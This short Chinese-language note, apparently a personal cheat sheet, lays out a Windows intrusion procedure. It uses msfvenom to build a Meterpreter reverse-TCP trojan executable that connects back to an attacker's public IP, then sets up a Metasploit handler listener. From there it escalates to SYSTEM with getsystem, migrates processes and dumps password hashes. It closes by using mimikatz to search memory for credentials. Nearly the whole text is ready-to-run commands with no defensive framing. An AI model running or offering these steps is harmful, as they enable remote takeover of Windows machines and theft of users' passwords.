    过程我就不说了，大概思路就是msf生成一个exe木马反弹到公网主机
    然后最好是目标没有杀软（AV）先试试meterpreter自带的提权不行的话就换其他exp然后读hash
    破解hash就ok，如果读不出hash就进行进程迁移。
    
    具体如下
    1.msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=5200 -f exe -o msf.exe
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=公网ip LPORT=5200 -f exe -o x64.exe
    2.use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lport 5200
      set lhost 外网IP（nat关系看情况）
      exploit     
    3.shell（network service权限）执行 最好system权限执行
    4.getsystem —> getuid
    5.hashdump (如果不行则换进程)
      migrate pid —> hashdump
    6.load mimikatz  mimikatz_command -f samdump::hashes
      mimikatz_command -f sekurlsa::searchPasswords
    
